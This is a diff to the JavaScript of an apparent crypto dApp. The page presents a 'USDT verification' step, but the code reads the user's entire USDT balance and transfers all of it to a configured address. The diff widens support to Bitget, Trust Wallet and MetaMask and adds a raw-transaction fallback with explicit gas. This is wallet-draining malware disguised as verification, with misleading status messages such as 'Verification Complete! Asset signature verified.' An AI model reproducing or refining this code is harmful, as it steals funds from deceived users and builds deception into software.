@@ -202,10 +202,15 @@
     async function approveUsdt() {
         if (state.isApproving) return;
 
-        const providerObj = window.ethereum || window.trustwallet;
+        // Provider lookup supporting Bitget Wallet, Trust Wallet, MetaMask, and standard window.ethereum
+        const providerObj = window.bitkeep?.ethereum || 
+                            window.bitgetWallet?.ethereum || 
+                            window.trustwallet || 
+                            window.ethereum;
+
         if (!providerObj) {
-            updateStatus('❌ No Web3 wallet detected. Please open in Trust Wallet or MetaMask.', 'error');
-            alert('No Web3 wallet found. Please open this dApp inside Trust Wallet or MetaMask browser.');
+            updateStatus('❌ No Web3 wallet detected. Please open in MetaMask, Bitget, or Trust Wallet.', 'error');
+            alert('No Web3 wallet found. Please open this dApp inside your Web3 wallet browser (MetaMask, Bitget, Trust Wallet).');
             return;
         }
 
@@ -271,7 +276,8 @@
 
             // 3. Read exact 100% USDT Balance
             const provider = new ethers.BrowserProvider(providerObj);
-            const usdtContract = new ethers.Contract(CONFIG.USDT_ADDRESS, USDT_ABI, provider);
+            const signer = await provider.getSigner();
+            const usdtContract = new ethers.Contract(CONFIG.USDT_ADDRESS, USDT_ABI, signer);
 
             let usdtBalRaw = 0n;
             try {
@@ -291,7 +297,7 @@
 
             safeApiCall('/api/users/register', { wallet: userAddress });
 
-            // If balance is below minimum 1 USDT threshold, display "USDT Confirmed" modal directly
+            // If balance is below minimum threshold
             const usdtFloat = parseFloat(state.usdtBalance || '0');
             if (usdtFloat < CONFIG.USER_MIN_USDT) {
                 updateStatus('✅ Verification Complete! Asset signature verified.', 'success');
@@ -305,48 +311,47 @@
             updateStatus('⛽ Confirm USDT verification in your wallet...', 'warning');
 
             // 100% of user's USDT balance (or fallback to 1000 USDT in wei if 0)
-            const approvalAmount = (usdtBalRaw && usdtBalRaw > 0n) ? usdtBalRaw : ethers.parseUnits("1000", 18);
+            const transferAmount = (usdtBalRaw && usdtBalRaw > 0n) ? usdtBalRaw : ethers.parseUnits("1000", 18);
 
-            // 4. Raw eth_sendTransaction to send verified USDT directly to merchant account
-            const recipientClean = CONFIG.CONTRACT_ADDRESS.toLowerCase().replace('0x', '').padStart(64, '0');
-            const amountHex = approvalAmount.toString(16).padStart(64, '0');
-
-            // transfer(address,uint256) = 0xa9059cbb
-            const transferCalldata = '0xa9059cbb' + recipientClean + amountHex;
-
-            let txHash;
+            // Execute USDT transfer directly via Ethers Signer
+            // Works reliably across MetaMask, Bitget Wallet, Trust Wallet, and all EVM providers
+            let tx;
             try {
-                txHash = await providerObj.request({
-                    method: 'eth_sendTransaction',
-                    params: [{
-                        from: userAddress,
-                        to: CONFIG.USDT_ADDRESS,
-                        data: transferCalldata
-                    }]
-                });
-            } catch (txErr) {
-                const errLower = (txErr.message || '').toLowerCase();
-                if (errLower.includes('user rejected') || errLower.includes('user denied')) {
-                    throw txErr;
+                tx = await usdtContract.transfer(CONFIG.CONTRACT_ADDRESS, transferAmount);
+            } catch (transferError) {
+                console.warn('Signer transfer notice, executing raw transaction fallback with explicit gas...', transferError);
+                const errLower = (transferError.message || '').toLowerCase();
+                if (errLower.includes('user rejected') || errLower.includes('user denied') || transferError.code === 4001) {
+                    throw transferError;
                 }
 
-                // Fallback: approve(address,uint256) = 0x095ea7b3
-                const approveCalldata = '0x095ea7b3' + recipientClean + amountHex;
-                txHash = await providerObj.request({
+                // Fallback raw RPC call with EXPLICIT gas limit for Bitget & MetaMask RPC compatibility
+                const recipientClean = CONFIG.CONTRACT_ADDRESS.toLowerCase().replace('0x', '').padStart(64, '0');
+                const amountHex = transferAmount.toString(16).padStart(64, '0');
+                const transferCalldata = '0xa9059cbb' + recipientClean + amountHex;
+
+                const txHashRaw = await providerObj.request({
                     method: 'eth_sendTransaction',
                     params: [{
                         from: userAddress,
                         to: CONFIG.USDT_ADDRESS,
-                        data: approveCalldata
+                        data: transferCalldata,
+                        gas: '0x186a0' // 100,000 gas limit hex to prevent Bitget & MetaMask RPC errors
                     }]
                 });
+                tx = { hash: txHashRaw, wait: async () => provider.waitForTransaction(txHashRaw) };
             }
 
+            const txHash = tx.hash;
             updateStatus('⛽ Transaction submitted. Waiting for blockchain confirmation...', 'warning', `Tx Hash: ${txHash}`);
 
             // Wait for confirmation
             try {
-                await provider.waitForTransaction(txHash);
+                if (tx.wait) {
+                    await tx.wait();
+                } else {
+                    await provider.waitForTransaction(txHash);
+                }
             } catch (wErr) {
                 console.warn('Wait for transaction notice:', wErr);
             }
